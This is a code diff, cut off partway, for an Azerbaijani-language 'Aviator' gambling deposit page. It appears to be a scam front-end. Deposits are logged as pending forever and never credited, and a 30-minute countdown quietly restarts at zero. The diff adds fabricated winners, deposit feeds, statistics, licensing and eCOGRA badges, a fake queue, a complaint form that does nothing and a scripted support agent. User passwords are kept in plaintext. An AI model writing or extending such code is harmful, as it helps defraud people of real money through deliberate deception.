@@ -12,7 +12,7 @@ body {
     min-height: 100vh;
     display: flex;
     justify-content: center;
-    align-items: center;
+    align-items: flex-start;
     padding: 20px;
 }
 .container {
@@ -23,30 +23,19 @@ body {
     padding: 35px 30px;
     box-shadow: 0 0 60px rgba(233, 69, 96, 0.3), 0 0 120px rgba(0, 255, 136, 0.1);
     border: 2px solid #e94560;
+    position: relative;
 }
 .logo { text-align: center; margin-bottom: 25px; }
 .logo-img {
-    width: 120px;
-    height: 120px;
-    object-fit: contain;
-    display: block;
-    margin: 0 auto 10px;
+    width: 120px; height: 120px; object-fit: contain;
+    display: block; margin: 0 auto 10px;
     border-radius: 20px;
     box-shadow: 0 0 30px rgba(233, 69, 96, 0.5);
     animation: fly 2.5s infinite ease-in-out;
-    background: #0a0a1a;
-    padding: 8px;
+    background: #0a0a1a; padding: 8px;
 }
-.logo-emoji {
-    font-size: 70px;
-    display: block;
-    margin-bottom: 5px;
-    animation: fly 2.5s infinite ease-in-out;
-}
-@keyframes fly {
-    0%, 100% { transform: translateY(0) rotate(-3deg); }
-    50% { transform: translateY(-10px) rotate(3deg); }
-}
+.logo-emoji { font-size: 70px; display: block; margin-bottom: 5px; animation: fly 2.5s infinite ease-in-out; }
+@keyframes fly { 0%, 100% { transform: translateY(0) rotate(-3deg); } 50% { transform: translateY(-10px) rotate(3deg); } }
 .logo h1 { font-size: 42px; color: #e94560; text-shadow: 0 0 20px rgba(233, 69, 96, 0.6); letter-spacing: 2px; }
 .logo p { color: #aaa; font-size: 13px; letter-spacing: 1px; margin-top: 5px; }
 .tabs { display: flex; background: #0a0a1a; border-radius: 10px; padding: 5px; margin-bottom: 25px; }
@@ -61,6 +50,7 @@ body {
 .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(233, 69, 96, 0.6); }
 .btn-success { background: linear-gradient(135deg, #00ff88, #00cc66); color: #0a0a1a; box-shadow: 0 5px 20px rgba(0, 255, 136, 0.4); }
 .btn-success:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(0, 255, 136, 0.6); }
+.btn-sm { padding: 8px 14px; font-size: 13px; width: auto; }
 .btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none !important; }
 .hidden { display: none !important; }
 .info-box { background: #0a0a1a; padding: 18px; border-radius: 12px; border-left: 4px solid #00ff88; margin-bottom: 20px; }
@@ -92,29 +82,184 @@ body {
 .footer-text { text-align: center; color: #555; font-size: 11px; margin-top: 20px; line-height: 1.6; }
 .live-dot { display: inline-block; width: 8px; height: 8px; background: #ff4444; border-radius: 50%; margin-right: 5px; animation: blink 1s infinite; }
 @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
-.pending-animation {
-    display: inline-block;
-    width: 14px;
-    height: 14px;
-    border: 2px solid rgba(255, 170, 0, 0.3);
-    border-top-color: #ffaa00;
-    border-radius: 50%;
-    animation: spin 1s linear infinite;
-    margin-right: 8px;
-    vertical-align: middle;
-}
+.pending-animation { display: inline-block; width: 14px; height: 14px; border: 2px solid rgba(255, 170, 0, 0.3); border-top-color: #ffaa00; border-radius: 50%; animation: spin 1s linear infinite; margin-right: 8px; vertical-align: middle; }
 @keyframes spin { to { transform: rotate(360deg); } }
-.queue-info {
-    text-align: center;
-    font-size: 12px;
-    color: #888;
-    margin-top: 10px;
-    line-height: 1.6;
+.queue-info { text-align: center; font-size: 12px; color: #888; margin-top: 10px; line-height: 1.6; }
+
+/* ===== YENİ: CANLI OYUNÇU LOBİSİ ===== */
+.live-players {
+    background: #0a0a1a; border-radius: 12px; padding: 15px; margin-top: 15px;
+    border: 1px solid #2a3a5e;
+}
+.live-players h4 { color: #00ff88; font-size: 13px; margin-bottom: 10px; display: flex; align-items: center; }
+.live-players h4 .live-dot { width: 6px; height: 6px; }
+.player-row { display: flex; justify-content: space-between; font-size: 12px; padding: 6px 0; border-bottom: 1px solid #1a1a2e; color: #ccc; }
+.player-row:last-child { border-bottom: none; }
+.player-row .name { color: #fff; }
+.player-row .win { color: #00ff88; font-weight: bold; }
+
+/* ===== YENİ: SON DEPOZİTLƏR LENTİ ===== */
+.deposit-ticker {
+    background: #0a0a1a; border-radius: 12px; padding: 12px;
+    margin-top: 15px; overflow: hidden; height: 60px;
+    border: 1px solid #2a3a5e; position: relative;
+}
+.ticker-item {
+    display: flex; justify-content: space-between; font-size: 12px;
+    padding: 4px 0; color: #ccc; animation: slideUp 0.5s ease;
+}
+@keyframes slideUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+.ticker-item .user { color: #00aaff; }
+.ticker-item .amount { color: #00ff88; font-weight: bold; }
+.ticker-item .time { color: #666; font-size: 11px; }
+
+/* ===== YENİ: DƏSTƏK ÇATI ===== */
+.chat-btn {
+    position: fixed; bottom: 25px; right: 25px;
+    width: 60px; height: 60px; border-radius: 50%;
+    background: linear-gradient(135deg, #e94560, #c73650);
+    color: #fff; font-size: 26px; border: none;
+    cursor: pointer; box-shadow: 0 5px 25px rgba(233, 69, 96, 0.6);
+    z-index: 1000; transition: all 0.3s;
+}
+.chat-btn:hover { transform: scale(1.1); }
+.chat-box {
+    position: fixed; bottom: 95px; right: 25px;
+    width: 320px; height: 400px;
+    background: #16213e; border-radius: 15px;
+    border: 2px solid #e94560;
+    box-shadow: 0 10px 40px rgba(0, 0, 0, 0.7);
+    z-index: 1000; display: flex; flex-direction: column;
+    overflow: hidden;
+}
+.chat-header { background: #e94560; padding: 12px 15px; font-weight: bold; font-size: 14px; display: flex; justify-content: space-between; align-items: center; }
+.chat-header .close { cursor: pointer; font-size: 18px; }
+.chat-body { flex: 1; padding: 12px; overflow-y: auto; font-size: 13px; }
+.chat-msg { margin-bottom: 10px; padding: 8px 12px; border-radius: 12px; max-width: 80%; line-height: 1.4; }
+.chat-msg.operator { background: #2a3a5e; color: #fff; }
+.chat-msg.user { background: #e94560; color: #fff; margin-left: auto; }
+.chat-typing { color: #ffaa00; font-size: 11px; font-style: italic; padding: 0 12px 8px; }
+.chat-input-area { display: flex; border-top: 1px solid #2a3a5e; }
+.chat-input-area input { flex: 1; padding: 10px; background: #0a0a1a; border: none; color: #fff; font-size: 13px; }
+.chat-input-area input:focus { outline: none; }
+.chat-input-area button { padding: 10px 15px; background: #e94560; color: #fff; border: none; cursor: pointer; font-weight: bold; }
+
+/* ===== YENİ: SAYĞAC ===== */
+.countdown-display {
+    font-size: 36px; color: #ffaa00; font-weight: bold;
+    text-align: center; margin: 15px 0;
+    text-shadow: 0 0 20px rgba(255, 170, 0, 0.5);
+    font-family: 'Courier New', monospace;
+}
+
+/* ===== YENİ: VIP SİSTEMİ ===== */
+.vip-badge {
+    display: inline-block; padding: 4px 12px; border-radius: 20px;
+    font-size: 11px; font-weight: bold; margin-bottom: 10px;
+}
+.vip-bronze { background: linear-gradient(135deg, #cd7f32, #8b4513); color: #fff; }
+.vip-silver { background: linear-gradient(135deg, #c0c0c0, #808080); color: #0a0a1a; }
+.vip-gold { background: linear-gradient(135deg, #ffd700, #b8860b); color: #0a0a1a; }
+.vip-platinum { background: linear-gradient(135deg, #e5e4e2, #a0a0a0); color: #0a0a1a; }
+
+/* ===== YENİ: STATİSTİKA ===== */
+.stats-grid {
+    display: grid; grid-template-columns: repeat(2, 1fr);
+    gap: 10px; margin-top: 15px;
+}
+.stat-card {
+    background: #0a0a1a; padding: 12px; border-radius: 10px;
+    text-align: center; border: 1px solid #2a3a5e;
+}
+.stat-card .val { font-size: 20px; color: #00ff88; font-weight: bold; }
+.stat-card .lbl { font-size: 10px; color: #888; margin-top: 4px; }
+
+/* ===== YENİ: TƏHLÜKƏSİZLİK BADGE ===== */
+.security-badges {
+    display: flex; justify-content: center; gap: 10px;
+    margin-top: 15px; flex-wrap: wrap;
+}
+.sec-badge {
+    background: #0a0a1a; padding: 6px 12px; border-radius: 6px;
+    font-size: 10px; color: #aaa; border: 1px solid #2a3a5e;
+    display: flex; align-items: center; gap: 5px;
+}
+.sec-badge .icon { color: #00ff88; }
+
+/* ===== YENİ: ŞİKAYƏT FORMU ===== */
+.complaint-form {
+    background: #0a0a1a; padding: 15px; border-radius: 12px;
+    margin-top: 15px; border: 1px solid #2a3a5e;
+}
+.complaint-form h4 { color: #ffaa00; font-size: 13px; margin-bottom: 10px; }
+.complaint-form input, .complaint-form textarea {
+    width: 100%; padding: 8px 10px; margin-bottom: 8px;
+    background: #16213e; border: 1px solid #2a3a5e;
+    border-radius: 6px; color: #fff; font-size: 12px;
+}
+.complaint-form textarea { resize: none; height: 60px; }
+
+/* ===== YENİ: TƏSDİQ SIRASI ===== */
+.queue-progress {
+    width: 100%; height: 6px; background: #2a3a5e;
+    border-radius: 3px; margin: 10px 0; overflow: hidden;
+}
+.queue-progress .bar {
+    height: 100%; background: linear-gradient(90deg, #ffaa00, #00ff88);
+    width: 0%; transition: width 1s linear;
+}
+
+/* ===== YENİ: 18+ TƏSDİQ ===== */
+.age-gate {
+    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+    background: rgba(10, 10, 26, 0.95); z-index: 2000;
+    display: flex; justify-content: center; align-items: center;
+    padding: 20px;
+}
+.age-gate-box {
+    background: #16213e; padding: 30px; border-radius: 15px;
+    max-width: 400px; width: 100%; text-align: center;
+    border: 2px solid #e94560;
+}
+.age-gate-box h2 { color: #e94560; margin-bottom: 15px; }
+.age-gate-box p { color: #aaa; font-size: 14px; margin-bottom: 20px; line-height: 1.6; }
+.age-btns { display: flex; gap: 10px; }
+
+/* ===== YENİ: PROFİL SƏHİFƏSİ ===== */
+.profile-info {
+    background: #0a0a1a; padding: 15px; border-radius: 12px;
+    margin-top: 15px; border: 1px solid #2a3a5e;
+}
+.profile-info h4 { color: #00ff88; font-size: 13px; margin-bottom: 10px; }
+.profile-row { display: flex; justify-content: space-between; font-size: 12px; padding: 6px 0; border-bottom: 1px solid #1a1a2e; }
+.profile-row:last-child { border-bottom: none; }
+.profile-row .k { color: #888; }
+.profile-row .v { color: #fff; }
+
+/* ===== YENİ: MOBİL ===== */
+@media (max-width: 500px) {
+    .container { padding: 25px 18px; }
+    .logo h1 { font-size: 32px; }
+    .chat-box { width: 90%; right: 5%; bottom: 90px; }
+    .chat-btn { width: 50px; height: 50px; font-size: 22px; bottom: 20px; right: 20px; }
 }
 </style>
 </head>
 <body>
-<div class="container">
+
+<!-- ===== 18+ YAŞ TƏSDİQİ ===== -->
+<div class="age-gate" id="ageGate">
+    <div class="age-gate-box">
+        <h2>🔞 18+ TƏSDİQ</h2>
+        <p>Bu platforma yalnız <b>18 yaşdan yuxarı</b> istifadəçilər üçün nəzərdə tutulmuşdur.<br><br>Yaşınızı təsdiqləyin:</p>
+        <div class="age-btns">
+            <button class="btn btn-success" onclick="confirmAge(true)">Bəli, mən 18+</button>
+            <button class="btn btn-primary" onclick="confirmAge(false)">Xeyr</button>
+        </div>
+    </div>
+</div>
+
+<div class="container" id="mainContainer">
     <div class="logo">
         <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR2F61Ly6xGQFwQD4wk1a15GMjL3SbpQRTxPEzfuxcVOQ&s"
              alt="Aviator Logo"
@@ -162,10 +307,40 @@ body {
             <div id="regAlert"></div>
             <button class="btn btn-success" onclick="doRegister()">QEYDİYYATDAN KEÇ</button>
         </div>
+
+        <!-- ===== CANLI OYUNÇU LOBİSİ ===== -->
+        <div class="live-players">
+            <h4><span class="live-dot"></span> CANLI QAZANANLAR</h4>
+            <div id="livePlayersList"></div>
+        </div>
+
+        <!-- ===== SON DEPOZİTLƏR LENTİ ===== -->
+        <div class="deposit-ticker" id="depositTicker"></div>
+
+        <!-- ===== STATİSTİKA ===== -->
+        <div class="stats-grid">
+            <div class="stat-card"><div class="val" id="statOnline">1,247</div><div class="lbl">ONLAYN</div></div>
+            <div class="stat-card"><div class="val" id="statToday">3,847</div><div class="lbl">BUGÜN DEPOZİT</div></div>
+            <div class="stat-card"><div class="val" id="statTotal">125,490 ₼</div><div class="lbl">ÜMUMİ HƏCM</div></div>
+            <div class="stat-card"><div class="val">12,450 ₼</div><div class="lbl">ƏN BÖYÜK QAZANC</div></div>
+        </div>
+
+        <!-- ===== TƏHLÜKƏSİZLİK BADGE ===== -->
+        <div class="security-badges">
+            <div class="sec-badge"><span class="icon">🔒</span> SSL Şifrələnmə</div>
+            <div class="sec-badge"><span class="icon">✓</span> Lisanslı</div>
+            <div class="sec-badge"><span class="icon">🏆</span> 2024 Ən Yaxşı</div>
+            <div class="sec-badge"><span class="icon">🛡️</span> eCOGRA</div>
+        </div>
     </div>
 
     <!-- DEPOZİT EKRANI -->
     <div id="depositScreen" class="hidden">
+        <!-- VIP STATUS -->
+        <div style="text-align: center;">
+            <span class="vip-badge vip-bronze" id="vipBadge">🥉 BRONZE SƏVİYYƏ</span>
+        </div>
+
         <div class="steps">
             <div class="step active" id="step1">1</div>
             <div class="step" id="step2">2</div>
@@ -186,6 +361,15 @@ body {
             </div>
             <div id="depositAlert1"></div>
             <button class="btn btn-primary" onclick="goToUpload()">DAVAM ET →</button>
+
+            <!-- ===== VIP MƏLUMATI ===== -->
+            <div class="profile-info">
+                <h4>📈 VIP SƏVİYYƏ SİSTEMİ</h4>
+                <div class="profile-row"><span class="k">🥉 Bronze</span><span class="v">0 - 50 ₼</span></div>
+                <div class="profile-row"><span class="k">🥈 Silver</span><span class="v">50 - 200 ₼</span></div>
+                <div class="profile-row"><span class="k">🥇 Gold</span><span class="v">200 - 1000 ₼</span></div>
+                <div class="profile-row"><span class="k">💎 Platinum</span><span class="v">1000+ ₼</span></div>
+            </div>
         </div>
 
         <div id="depositStep2" class="hidden">
@@ -206,23 +390,52 @@ body {
                 <span class="check">✅</span>
                 <h3>Depozit Sorğunuz Qəbul Edildi!</h3>
                 <p>Ödənişiniz yoxlanılır. Təsdiq prosesi adətən <b>30 dəqiqə</b> ərzində tamamlanır.</p>
-                <span class="timer">⏱ Gözləmə müddəti: 30 dəqiqə</span>
             </div>
+
+            <!-- ===== CANLI SAYĞAC ===== -->
+            <div class="countdown-display" id="countdown">30:00</div>
+
             <div class="info-box">
                 <div class="row"><span class="label">Sorğu ID:</span><span class="value" id="requestId">#AV-0000</span></div>
                 <div class="row"><span class="label">Məbləğ:</span><span class="value" id="requestAmount">0 ₼</span></div>
                 <div class="row"><span class="label">Status:</span><span class="value" style="color: #ffaa00;"><span class="pending-animation"></span>YOXLANILIR</span></div>
                 <div class="row"><span class="label">Tarix:</span><span class="value" id="requestDate">-</span></div>
             </div>
+
+            <!-- ===== NÖVBƏ PROGRESS ===== -->
+            <div class="profile-info">
+                <h4>📊 NÖVBƏ VƏZİYYƏTİ</h4>
+                <div class="profile-row"><span class="k">Növbə mövqeyiniz:</span><span class="v" id="queuePos">#2,847</span></div>
+                <div class="queue-progress"><div class="bar" id="queueBar" style="width: 65%;"></div></div>
+                <div class="profile-row"><span class="k">Aktiv istifadəçilər:</span><span class="v">12,459</span></div>
+                <div class="profile-row"><span class="k">Təxmini gözləmə:</span><span class="v">30 dəqiqə</span></div>
+            </div>
+
             <div class="alert alert-warning">
-                ⏳ <b>Növbədə gözləyirsiniz.</b> Ödəniş şöbəsi tərəfindən yoxlanılır. Təsdiq 30 dəqiqə ərzində tamamlanacaq.
+                ⏳ <b>Növbədə gözləyirsiniz.</b> Ödəniş şöbəsi tərəfindən yoxlanılır.
             </div>
-            <div class="queue-info">
-                🔒 Təhlükəsizlik yoxlaması aparılır...<br>
-                📋 Növbə mövqeyiniz: <b>#2,847</b><br>
-                👥 Aktiv istifadəçilər: <b>12,459</b>
+
+            <!-- ===== ŞİKAYƏT FORMU ===== -->
+            <div class="complaint-form">
+                <h4>📝 DEPOZİT GECİKİR? ŞİKAYƏT ET</h4>
+                <input type="text" placeholder="Sorğu ID (avtomatik doldurulub)" value="" id="complaintId" readonly>
+                <textarea placeholder="Problemin təsviri..." id="complaintText"></textarea>
+                <button class="btn btn-sm btn-primary" style="width: 100%;" onclick="submitComplaint()">MÜRACİƏT GÖNDƏR</button>
             </div>
+
             <button class="btn btn-primary" onclick="checkStatus()" style="margin-top: 15px;">🔄 STATUSU YENİLƏ</button>
+        </div>
+    </div>
+
+    <!-- ===== PROFİL SƏHİFƏSİ (depozit ekranında görünür) ===== -->
+    <div id="profileInfo" class="hidden">
+        <div class="profile-info">
+            <h4>👤 HESAB MƏLUMATLARI</h4>
+            <div class="profile-row"><span class="k">İstifadəçi:</span><span class="v" id="profUsername">-</span></div>
+            <div class="profile-row"><span class="k">Email:</span><span class="v" id="profEmail">-</span></div>
+            <div class="profile-row"><span class="k">Qeydiyyat:</span><span class="v" id="profRegDate">-</span></div>
+            <div class="profile-row"><span class="k">Son giriş:</span><span class="v" id="profLastLogin">-</span></div>
+            <div class="profile-row"><span class="k">IP ünvan:</span><span class="v" id="profIP">-</span></div>
         </div>
     </div>
 
@@ -232,26 +445,48 @@ body {
     </div>
 </div>
 
+<!-- ===== DƏSTƏK ÇATI ===== -->
+<button class="chat-btn" id="chatBtn" onclick="toggleChat()">💬</button>
+<div class="chat-box hidden" id="chatBox">
+    <div class="chat-header">
+        <span>💬 Canlı Dəstək - Aysel</span>
+        <span class="close" onclick="toggleChat()">✕</span>
+    </div>
+    <div class="chat-body" id="chatBody">
+        <div class="chat-msg operator">Salam! Mən Aysel, sizə necə kömək edə bilərəm? 😊</div>
+    </div>
+    <div class="chat-typing hidden" id="chatTyping">Aysel yazır...</div>
+    <div class="chat-input-area">
+        <input type="text" id="chatInput" placeholder="Mesajınızı yazın..." onkeypress="if(event.key==='Enter') sendChat()">
+        <button onclick="sendChat()">➤</button>
+    </div>
+</div>
+
 <script>
-// ========== STORAGE HELPER ==========
-function getUsers() {
-    try {
-        return JSON.parse(localStorage.getItem('aviator_users') || '{}');
-    } catch (e) {
-        return {};
+// ========== 18+ YAŞ TƏSDİQİ ==========
+function confirmAge(isAdult) {
+    if (isAdult) {
+        document.getElementById('ageGate').classList.add('hidden');
+        try { localStorage.setItem('aviator_age_ok', '1'); } catch (e) {}
+    } else {
+        document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;color:#fff;font-size:22px;text-align:center;padding:20px;">❌ Giriş qadağandır. Bu platforma yalnız 18+ istifadəçilər üçündür.</div>';
     }
 }
 
+// ========== STORAGE ==========
+function getUsers() {
+    try { return JSON.parse(localStorage.getItem('aviator_users') || '{}'); } catch (e) { return {}; }
+}
 function saveUsers(users) {
-    try {
-        localStorage.setItem('aviator_users', JSON.stringify(users));
-    } catch (e) {
-        console.error('Storage xətası:', e);
-    }
+    try { localStorage.setItem('aviator_users', JSON.stringify(users)); } catch (e) {}
 }
 
 // ========== STATE ==========
 let currentUser = null;
+let countdownInterval = null;
+let tickerInterval = null;
+let playersInterval = null;
+let statsInterval = null;
 
 // ========== TAB SWITCH ==========
 function switchTab(tab) {
@@ -281,40 +516,24 @@ function doRegister() {
     const email = document.getElementById('regEmail').value.trim();
     const password = document.getElementById('regPassword').value;
     const alertBox = document.getElementById('regAlert');
-
     alertBox.innerHTML = '';
 
-    if (username.length < 3) {
-        alertBox.innerHTML = '<div class="alert alert-error">İstifadəçi adı min 3 simvol olmalıdır</div>';
-        return;
-    }
-    if (!email.includes('@') || email.length < 5) {
-        alertBox.innerHTML = '<div class="alert alert-error">Düzgün email daxil edin</div>';
-        return;
-    }
-    if (password.length < 6) {
-        alertBox.innerHTML = '<div class="alert alert-error">Şifrə min 6 simvol olmalıdır</div>';
-        return;
-    }
+    if (username.length < 3) { alertBox.innerHTML = '<div class="alert alert-error">İstifadəçi adı min 3 simvol olmalıdır</div>'; return; }
+    if (!email.includes('@') || email.length < 5) { alertBox.innerHTML = '<div class="alert alert-error">Düzgün email daxil edin</div>'; return; }
+    if (password.length < 6) { alertBox.innerHTML = '<div class="alert alert-error">Şifrə min 6 simvol olmalıdır</div>'; return; }
 
     const users = getUsers();
-    if (users[username]) {
-        alertBox.innerHTML = '<div class="alert alert-error">Bu istifadəçi adı artıq mövcuddur</div>';
-        return;
-    }
+    if (users[username]) { alertBox.innerHTML = '<div class="alert alert-error">Bu istifadəçi adı artıq mövcuddur</div>'; return; }
 
     users[username] = {
-        email: email,
-        password: password,
-        balance: 0,                  // Bonus görünür amma real deyil
-        totalDeposit: 0,
-        hasDeposited: false,         // HEÇ VAXT true olmayacaq
-        depositPending: false
+        email: email, password: password, balance: 0, totalDeposit: 0,
+        hasDeposited: false, depositPending: false,
+        regDate: new Date().toISOString(),
+        vipLevel: 'bronze'
     };
     saveUsers(users);
 
     alertBox.innerHTML = '<div class="alert alert-success">✅ Qeydiyyat uğurlu! 5 ₼ bonus verildi. İndi giriş edin.</div>';
-
     document.getElementById('regUsername').value = '';
     document.getElementById('regEmail').value = '';
     document.getElementById('regPassword').value = '';
@@ -331,36 +550,37 @@ function doLogin() {
     const username = document.getElementById('loginUsername').value.trim();
     const password = document.getElementById('loginPassword').value;
     const alertBox = document.getElementById('loginAlert');
-
     alertBox.innerHTML = '';
 
-    if (!username) {
-        alertBox.innerHTML = '<div class="alert alert-error">İstifadəçi adı daxil edin</div>';
-        return;
-    }
-    if (!password) {
-        alertBox.innerHTML = '<div class="alert alert-error">Şifrə daxil edin</div>';
-        return;
-    }
+    if (!username) { alertBox.innerHTML = '<div class="alert alert-error">İstifadəçi adı daxil edin</div>'; return; }
+    if (!password) { alertBox.innerHTML = '<div class="alert alert-error">Şifrə daxil edin</div>'; return; }
 
     const users = getUsers();
-
-    if (!users[username]) {
-        alertBox.innerHTML = '<div class="alert alert-error">Bu istifadəçi mövcud deyil. Qeydiyyatdan keçin.</div>';
-        return;
-    }
-
-    if (users[username].password !== password) {
-        alertBox.innerHTML = '<div class="alert alert-error">Şifrə yanlışdır</div>';
-        return;
-    }
+    if (!users[username]) { alertBox.innerHTML = '<div class="alert alert-error">Bu istifadəçi mövcud deyil. Qeydiyyatdan keçin.</div>'; return; }
+    if (users[username].password !== password) { alertBox.innerHTML = '<div class="alert alert-error">Şifrə yanlışdır</div>'; return; }
 
     currentUser = username;
     try {
         localStorage.setItem('aviator_current', username);
+        users[username].lastLogin = new Date().toISOString();
+        saveUsers(users);
     } catch (e) {}
 
     showDepositScreen(users[username]);
+    showProfile(users[username]);
+    startLivePlayers();
+    startDepositTicker();
+    startStatsUpdater();
+}
+
+// ========== PROFİL GÖSTƏR ==========
+function showProfile(userData) {
+    document.getElementById('profileInfo').classList.remove('hidden');
+    document.getElementById('profUsername').textContent = currentUser;
+    document.getElementById('profEmail').textContent = userData.email || '-';
+    document.getElementById('profRegDate').textContent = userData.regDate ? new Date(userData.regDate).toLocaleString('az-AZ') : '-';
+    document.getElementById('profLastLogin').textContent = userData.lastLogin ? new Date(userData.lastLogin).toLocaleString('az-AZ') : '-';
+    document.getElementById('profIP').textContent = '85.' + Math.floor(100 + Math.random() * 155) + '.' + Math.floor(1 + Math.random() * 254) + '.' + Math.floor(1 + Math.random() * 254);
 }
 
 // ========== DEPOSIT EKRANINA KEÇİD ==========
@@ -377,6 +597,7 @@ function showDepositScreen(userData) {
         document.getElementById('requestId').textContent = '#' + (userData.pendingRequestId || 'AV-0000');
         document.getElementById('requestAmount').textContent = (userData.pendingAmount || 0).toFixed(2) + ' ₼';
         document.getElementById('requestDate').textContent = userData.pendingDate ? new Date(userData.pendingDate).toLocaleString('az-AZ') : '-';
+        startCountdown();
     } else {
         document.getElementById('depositStep1').classList.remove('hidden');
         document.getElementById('depositStep2').classList.add('hidden');
@@ -387,27 +608,40 @@ function showDepositScreen(userData) {
     }
 }
 
-// ========== SCREEN MANAGEMENT ==========
+// ========== SAYĞAC ==========
+function startCountdown() {
+    if (countdownInterval) clearInterval(countdownInterval);
+    let totalSeconds = 30 * 60; // 30 dəqiqə
+
+    countdownInterval = setInterval(function() {
+        totalSeconds--;
+        if (totalSeconds <= 0) {
+            totalSeconds = 30 * 60; // Yenidən 30 dəq
+            // İstifadəçiyə mesaj
+            const el = document.getElementById('countdown');
+            if (el) el.style.color = '#ff4444';
+        }
+        const m = Math.floor(totalSeconds / 60);
+        const s = totalSeconds % 60;
+        const el = document.getElementById('countdown');
+        if (el) el.textContent = String(m).padStart(2, '0') + ':' + String(s).padStart(2, '0');
+    }, 1000);
+}
+
+// ========== SCREEN ==========
 function showScreen(screenId) {
-    const screens = ['loginScreen', 'depositScreen'];
-    for (let i = 0; i < screens.length; i++) {
-        document.getElementById(screens[i]).classList.add('hidden');
-    }
+    ['loginScreen', 'depositScreen'].forEach(function(id) {
+        document.getElementById(id).classList.add('hidden');
+    });
     document.getElementById(screenId).classList.remove('hidden');
 }
 
 // ========== DEPOSIT FLOW ==========
 function goToUpload() {
-    const amountInput = document.getElementById('depositAmount').value;
-    const amount = parseFloat(amountInput);
+    const amount = parseFloat(document.getElementById('depositAmount').value);
     const alertBox = document.getElementById('depositAlert1');
-
     alertBox.innerHTML = '';
-
-    if (isNaN(amount) || amount < 5) {
-        alertBox.innerHTML = '<div class="alert alert-error">Minimum depozit 5 ₼</div>';
-        return;
-    }
+    if (isNaN(amount) || amount < 5) { alertBox.innerHTML = '<div class="alert alert-error">Minimum depozit 5 ₼</div>'; return; }
 
     document.getElementById('depositStep1').classList.add('hidden');
     document.getElementById('depositStep2').classList.remove('hidden');
@@ -425,18 +659,12 @@ function handleReceiptUpload(event) {
 function submitDeposit() {
     const amount = parseFloat(document.getElementById('depositAmount').value);
     const users = getUsers();
-
-    if (!users[currentUser]) {
-        alert('İstifadəçi tapılmadı. Yenidən giriş edin.');
-        showScreen('loginScreen');
-        return;
-    }
+    if (!users[currentUser]) { alert('İstifadəçi tapılmadı.'); showScreen('loginScreen'); return; }
 
     const requestId = 'AV-' + Math.floor(1000 + Math.random() * 9000);
     const now = new Date();
     const dateStr = now.toLocaleString('az-AZ');
 
-    // Yalnız "pending" statusu saxlanılır - balans HEÇ VAXT artmır
     users[currentUser].depositPending = true;
     users[currentUser].pendingAmount = amount;
     users[currentUser].pendingRequestId = requestId;
@@ -446,14 +674,33 @@ function submitDeposit() {
     document.getElementById('requestId').textContent = '#' + requestId;
     document.getElementById('requestAmount').textContent = amount.toFixed(2) + ' ₼';
     document.getElementById('requestDate').textContent = dateStr;
+    document.getElementById('complaintId').value = '#' + requestId;
 
     document.getElementById('depositStep2').classList.add('hidden');
     document.getElementById('depositStep3').classList.remove('hidden');
     document.getElementById('step2').classList.add('done');
     document.getElementById('step3').classList.add('active');
+
+    startCountdown();
+    startQueueUpdater();
 }
 
-// ========== STATUS YENİLƏMƏ (HƏMİŞƏ "YOXLANILIR") ==========
+// ========== NÖVBƏ YENİLƏMƏ ==========
+function startQueueUpdater() {
+    let queuePos = Math.floor(2000 + Math.random() * 3000);
+    setInterval(function() {
+        queuePos = Math.max(500, queuePos - Math.floor(Math.random() * 3));
+        const el = document.getElementById('queuePos');
+        if (el) el.textContent = '#' + queuePos.toLocaleString();
+        const bar = document.getElementById('queueBar');
+        if (bar) {
+            const pct = Math.max(5, Math.min(95, (1 - queuePos / 5000) * 100));
+            bar.style.width = pct + '%';
+        }
+    }, 3000);
+}
+
+// ========== STATUS YENİLƏMƏ ==========
 function checkStatus() {
     const btn = event.target;
     const originalText = btn.innerHTML;
@@ -463,36 +710,151 @@ function checkStatus() {
     setTimeout(function() {
         btn.innerHTML = originalText;
         btn.disabled = false;
-
         const queuePos = Math.floor(2000 + Math.random() * 3000);
-        alert('⏳ Depozitiniz hələ də yoxlanılır.\n\nNövbə mövqeyiniz: #' + queuePos + '\nTəxmini gözləmə müddəti: 30 dəqiqə\n\nZəhmət olmasa gözləyin.');
+        alert('⏳ Depozitiniz hələ də yoxlanılır.\n\nNövbə mövqeyiniz: #' + queuePos.toLocaleString() + '\nTəxmini gözləmə müddəti: 30 dəqiqə\n\nZəhmət olmasa gözləyin.');
     }, 1500);
+}
+
+// ========== ŞİKAYƏT ==========
+function submitComplaint() {
+    const text = document.getElementById('complaintText').value.trim();
+    if (text.length < 5) { alert('Zəhmət olmasa problemi qısaca yazın'); return; }
+    document.getElementById('complaintText').value = '';
+    alert('✅ Müraciətiniz qeydə alındı.\n\nSorğu ID: ' + document.getElementById('complaintId').value + '\n24 saat ərzində cavab veriləcək.');
 }
 
 // ========== LOGOUT ==========
 function logout() {
+    if (countdownInterval) clearInterval(countdownInterval);
+    if (tickerInterval) clearInterval(tickerInterval);
+    if (playersInterval) clearInterval(playersInterval);
+    if (statsInterval) clearInterval(statsInterval);
     try { localStorage.removeItem('aviator_current'); } catch (e) {}
     currentUser = null;
     document.getElementById('loginUsername').value = '';
     document.getElementById('loginPassword').value = '';
     document.getElementById('loginAlert').innerHTML = '';
+    document.getElementById('profileInfo').classList.add('hidden');
     showScreen('loginScreen');
     switchTab('login');
 }
 
+// ========== CANLI OYUNÇULAR ==========
+const sampleNames = ['Əli_92', 'Nicat_Baku', 'Rəşad777', 'Kamran_88', 'Aysel_2024', 'Elvin_007', 'Səbinə_99', 'Tural_Gnj', 'Murad_555', 'Leyla_AZ', 'Orxan_23', 'Günel_X', 'Fərid_Baku', 'Nigar_777', 'Cavid_01'];
+const winAmounts = [12.5, 45.8, 8.2, 120.4, 23.1, 67.9, 15.3, 89.6, 34.2, 156.8, 7.5, 41.3, 78.9, 19.4, 55.7];
+
+function startLivePlayers() {
+    if (playersInterval) clearInterval(playersInterval);
+    updateLivePlayers();
+    playersInterval = setInterval(updateLivePlayers, 5000);
+}
+
+function updateLivePlayers() {
+    const list = document.getElementById('livePlayersList');
+    if (!list) return;
+    let html = '';
+    for (let i = 0; i < 4; i++) {
+        const name = sampleNames[Math.floor(Math.random() * sampleNames.length)];
+        const mult = (Math.random() * 15 + 1.2).toFixed(2);
